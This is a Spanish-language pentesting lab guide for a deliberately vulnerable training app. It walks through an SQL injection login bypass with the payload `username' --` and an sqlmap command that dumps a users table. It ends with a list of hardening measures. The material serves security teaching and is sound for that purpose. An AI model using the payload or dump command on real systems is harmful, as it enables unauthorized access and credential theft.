# Laboratorio de Pentesting: SQL Injection (SQLi)

## 1. Escenario
Estás ante una red social moderna llamada **VulnLab**. 
- **Frontend:** React (Puerto 5173)
- **Backend:** Node.js (Puerto 3000)

## 2. El Reto: Explotación
La plataforma parece segura y bien construida, pero su sistema de autenticación tiene un fallo crítico.

**Paso A: Bypass de Login**
Intenta entrar como cualquier usuario de la lista de la derecha sin conocer su contraseña.
- **Payload sugerido:** `username' --`

**Paso B: Auditoría de Datos con SQLMap**
```bash
sqlmap -u "http://<IP_OBJETIVO>:3000/login" --data '{"username":"admin","password":"123"}' --method POST --batch -D pentest_db -T users --dump
```

## 3. El Reto: Análisis
1. Una vez dentro como admin, revisa el **Admin Dashboard**.
2. ¿Cuántas identidades totales han sido comprometidas?
3. En el dashboard verás la lista de usuarios. ¿Qué color de perfil tiene el usuario `mike_dev`?
4. Crea tu propio post y luego búscalo en la base de datos usando `sqlmap`.

## 4. Comparación de Seguridad
El instructor mostrará un código "Hardened" (Reforzado) que utiliza:
- **Prisma ORM** (Prevención de SQLi)
- **Bcrypt** (Hashing de contraseñas)
- **Zod** (Validación de esquemas)
- **Helmet** (Cabeceras de seguridad)
